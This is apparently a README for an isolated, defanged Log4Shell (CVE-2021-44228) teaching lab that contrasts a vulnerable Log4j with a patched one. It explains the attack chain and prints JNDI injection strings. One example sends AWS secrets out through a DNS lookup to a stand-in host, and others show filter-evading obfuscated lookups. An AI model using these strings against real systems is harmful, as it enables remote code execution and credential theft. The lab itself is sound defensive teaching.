# Log4Shell Lab — CVE-2021-44228 (SC3010, educational)

A fully isolated, offline, **defanged** demonstration of the *mechanism* behind
Log4Shell (CVE-2021-44228). It reproduces the exact chain — a crafted string in
user-controlled input is **logged** by a vulnerable Log4j and ends up executing
attacker-supplied code inside the victim JVM — and contrasts it against an
identical app built on a patched Log4j.

---

## 1. Safety banner

> **This lab is for SC3010 coursework and defensive education only.**
>
> - **Isolated & offline.** Everything runs on a Docker network declared
>   `internal: true`, so **no container can reach the internet at runtime**.
>   The victim reaches the attacker only by the compose DNS name `attacker`.
> - **Defanged payload.** The "exploit" class runs the read-only command `id`
>   and prints a single `[EXPLOIT-PROOF]` line. There is **no reverse shell, no
>   network callback outside the lab, no file deletion, no persistence** — the
>   entire payload is reproduced verbatim in [attacker/Exploit.java](attacker/Exploit.java).
> - **Not a weapon.** The LDAP server is a teaching stand-in, the target is a
>   toy app, and the whole thing is built to *explain* the bug, not to attack
>   anything. Do not point it at systems you do not own.

---

## 2. Prepare / build / run

Requirements: Docker Desktop (or Docker Engine) with the Compose plugin. The
**build** needs internet access (to pull base images and the Log4j jars); the
**runtime** does not.

```bash
cd log4shell-lab

# Inspect the lab statically first (no build, no exploit):
python3 inspect_lab.py

# Build, run the full vulnerable-vs-patched demo, and tear down:
./run_lab.sh
```

Prefer to drive it by hand? The equivalent manual steps:

```bash
docker compose build                       # build attacker + both victims
docker compose up -d attacker              # start LDAP (:1389) + HTTP (:8000)
docker compose run --rm victim             # VULNERABLE 2.14.1  -> proof line
docker compose run --rm victim-patched     # PATCHED   2.17.1  -> inert
docker compose down --remove-orphans       # clean up
```

---

## 3. The crucial distinction: logging vs executing

The victim application ([vulnerable-app/.../VulnerableApp.java](vulnerable-app/src/main/java/com/sc3010/lab/VulnerableApp.java))
does exactly one noteworthy thing with untrusted input:

```java
logger.error("Processing user input: " + input);
```

There is **no `eval`, no `exec`, no "run this" call** anywhere in the app. The
bug fires the *moment the crafted string is written to the log*, because a
vulnerable Log4j runs **lookup substitution** over the message text while
formatting it. A `${...}` sequence in the message is treated as an instruction
to Log4j, and `${jndi:...}` tells it to go perform a JNDI lookup.

That is the whole lesson: **logging attacker-controlled data is not a passive
act** on a vulnerable Log4j. Loading or logging a value is not the same as the
application intending to run anything — yet here it is enough to achieve remote
code execution.

---

## 4. Historical attack end-to-end flow (CVE-2021-44228)

The original vulnerability chained these stages:

1. **Injection.** An attacker places `${jndi:ldap://evil.example/a}` somewhere
   that will be logged — a `User-Agent` header, a username field, a chat
   message, anything an app logs.
2. **Logging triggers substitution.** The vulnerable app logs the string. Log4j
   2.x (≤ 2.14.1, message lookups enabled by default) passes the message
   through `StrSubstitutor`, which **evaluates the `${jndi:...}` lookup**.
3. **JNDI lookup.** The `JndiLookup` handler asks JNDI to resolve the
   `ldap://…` name, contacting the attacker's LDAP server.
4. **Malicious reference returned.** The LDAP server replies with an entry
   describing a **JNDI `Reference`** (`objectClass: javaNamingReference`) whose
   `javaCodeBase` points at an attacker HTTP server and whose `javaFactory`
   names a class to instantiate.
5. **Remote class load.** Because remote-codebase loading is permitted (the
   pre-patch default, see §7), the victim JVM's `URLClassLoader` **fetches the
   class over HTTP** from the attacker.
6. **Code execution.** The JVM instantiates the class; its **`static`
   initializer runs**, achieving RCE inside the victim process.

In real-world incidents this foothold was used for **reverse shells and C2**,
**data exfiltration** (including **DNS-based** exfil, where secrets were encoded
into lookup hostnames such as `${jndi:dns://…/${env:AWS_SECRET_ACCESS_KEY}}`),
coin-miner drops, and ransomware staging. Defenders quickly saw **WAF-evasion**
via nested/obfuscating lookups — e.g. `${lower:j}ndi`, or default-value syntax
like `${${::-j}${::-n}di:…}` — to slip the literal string `jndi` past naive
filters.

**Sources** (paraphrased; read the originals):

- NVD — *CVE-2021-44228*: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Apache Log4j Security Vulnerabilities: https://logging.apache.org/log4j/2.x/security.html
- LunaSec — *Log4Shell* disclosure write-up: https://www.lunasec.io/docs/blog/log4j-zero-day/
- Cloudflare — *Inside the Log4j2 vulnerability*: https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/

---

## 5. How this project models those stages

| Stage (historical) | What this lab actually does | Where to see it |
|---|---|---|
| Injection into logged input | Passes `${jndi:ldap://attacker:1389/Exploit}` as the app's argument | [docker-compose.yml](docker-compose.yml) `command:` |
| Logging triggers substitution | `logger.error("Processing user input: " + input)` on Log4j **2.14.1** | [VulnerableApp.java](vulnerable-app/src/main/java/com/sc3010/lab/VulnerableApp.java) |
| JNDI → attacker LDAP | Victim resolves `ldap://attacker:1389/Exploit` over the internal network | [attacker/ldap_server.py](attacker/ldap_server.py) |
| Malicious Reference returned | LDAP entry: `javaClassName: Exploit`, `javaCodeBase: http://attacker:8000/`, `javaFactory: Exploit` | [attacker/ldap_server.py](attacker/ldap_server.py) `search_result_entry` |
| Remote class load over HTTP | Victim fetches `http://attacker:8000/Exploit.class` | [attacker/http_server.py](attacker/http_server.py) |
| Code execution (static init) | `Exploit`'s static block runs `id` and prints the proof line | [attacker/Exploit.java](attacker/Exploit.java) |
| Patched control | Identical app + input on Log4j **2.17.1** → inert | [patched-app/](patched-app/) |

---

## 6. Proof table

The three rows below are the expected, verified outcomes. The `${java:version}`
row is a safe, no-network way to prove that *lookup substitution itself* is
live on the vulnerable build and dead on the patched one (try it with
`docker compose run --rm victim '${java:version}'`).

| Input | Vulnerable (2.14.1) | Patched (2.17.1) |
|---|---|---|
| Normal message | Logged as-is | Logged as-is |
| `${java:version}` | Evaluated (JRE version appears in the log line) | Not evaluated (printed literally) |
| `${jndi:ldap://attacker:1389/Exploit}` | Class loaded, `[EXPLOIT-PROOF]` prints | Logged literally, inert |

### Verified run output (observed in this lab)

**Vulnerable victim (Log4j 2.14.1)** — code execution:

```
[APP] VulnerableApp starting (SC3010 Log4Shell lab)
[APP] About to log untrusted input (length=36)
[EXPLOIT-PROOF] Arbitrary code executed inside victim JVM. id => uid=0(root) gid=0(root) groups=0(root)
... ERROR com.sc3010.lab.VulnerableApp - Processing user input: ${jndi:ldap://attacker:1389/Exploit}
[APP] app finished (control returned to main)
```

**Patched victim (Log4j 2.17.1)** — identical input, inert (no proof line):

```
[APP] VulnerableApp starting (SC3010 Log4Shell lab)
[APP] About to log untrusted input (length=36)
... ERROR com.sc3010.lab.VulnerableApp - Processing user input: ${jndi:ldap://attacker:1389/Exploit}
[APP] app finished (control returned to main)
```

**Attacker side** — the full chain is visible in the attacker's own logs:

```
[LDAP] bindRequest (id=1) -> success
[LDAP] searchRequest (id=2) -> returning JNDI Reference to http://attacker:8000/Exploit.class
[HTTP] "GET /Exploit.class HTTP/1.1" 200 -
```

**`${java:version}` row** — proves lookup substitution itself is live/dead:

```
vulnerable 2.14.1 : Processing user input: Java version 1.8.0_504     (evaluated)
patched    2.17.1 : Processing user input: ${java:version}            (literal)
```

> **Note on the trailing `ClassCastException`.** On the vulnerable run you will
> also see a `javax.naming.NamingException … Exploit cannot be cast to
> javax.naming.spi.ObjectFactory` stack trace *after* the `[EXPLOIT-PROOF]`
> line. This is expected and harmless: our payload runs in the class's `static`
> initializer, which executes the instant the class is **loaded** — strictly
> before JNDI then tries to cast the instance to an `ObjectFactory` and fails.
> The exception is the (real) JNDI/`StrSubstitutor` call stack, and it usefully
> shows the exact code path (`JndiLookup → JndiManager → InitialContext.lookup`)
> that the lab is reproducing. The proof that code ran has already printed by
> then.


---

## 7. Why the `trustURLCodebase` flag is set

Modern JDK 8 builds ship with
`com.sun.jndi.ldap.object.trustURLCodebase=false`, which **blocks** the remote
LDAP→codebase class load that step 5 relies on. That default is itself one of
the real mitigations for Log4Shell.

To recreate the **pre-patch era behaviour reliably on any JDK 8 image**, both
victim containers launch the JVM with:

```
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true
```

This re-enables remote-codebase loading, matching how vulnerable deployments
behaved at the time. **Both** the vulnerable and the patched container use this
same flag on purpose — so the experiment proves that the fix is the **Log4j
library upgrade**, not the JVM flag or the logging config. Keeping
`trustURLCodebase=false` in the real world is a valid defence-in-depth measure;
here we deliberately turn it off to show the complete chain.

---

## 8. Limitations — what we deliberately do NOT reproduce

- **No reverse shell / no real C2.** The payload only runs `id` and prints a
  line.
- **No internet egress.** The runtime network is `internal: true`; nothing can
  call home.
- **Read-only payload.** No file writes outside the container, no deletion, no
  persistence, no privilege escalation.
- **The LDAP server is a lab stand-in.** It answers a bind and returns one
  crafted reference; it is not a real directory service and implements only a
  sliver of LDAP.
- **We re-enable `trustURLCodebase`** to recreate the vulnerable era (see §7);
  current JDK defaults would otherwise block the final hop.
- **No WAF-evasion / obfuscation.** We use the plain `${jndi:…}` form, not the
  nested `${lower:…}` / `${::-…}` tricks seen in the wild.
- **No multi-stage real-world payloads** (no miners, droppers, or ransomware
  staging).
- **Not a hardened production target.** This is a minimal teaching app, not a
  representative real service.

---

## Project layout

```
log4shell-lab/
  README.md              # this file
  docker-compose.yml     # attacker + victim + victim-patched on an internal net
  run_lab.sh             # build -> exploit vulnerable -> show patched inert -> teardown
  inspect_lab.py         # static facts, no exploit run
  vulnerable-app/        # Maven app, Log4j 2.14.1
  patched-app/           # identical source, Log4j 2.17.1 (control)
  attacker/              # LDAP referral + HTTP codebase + defanged Exploit
```
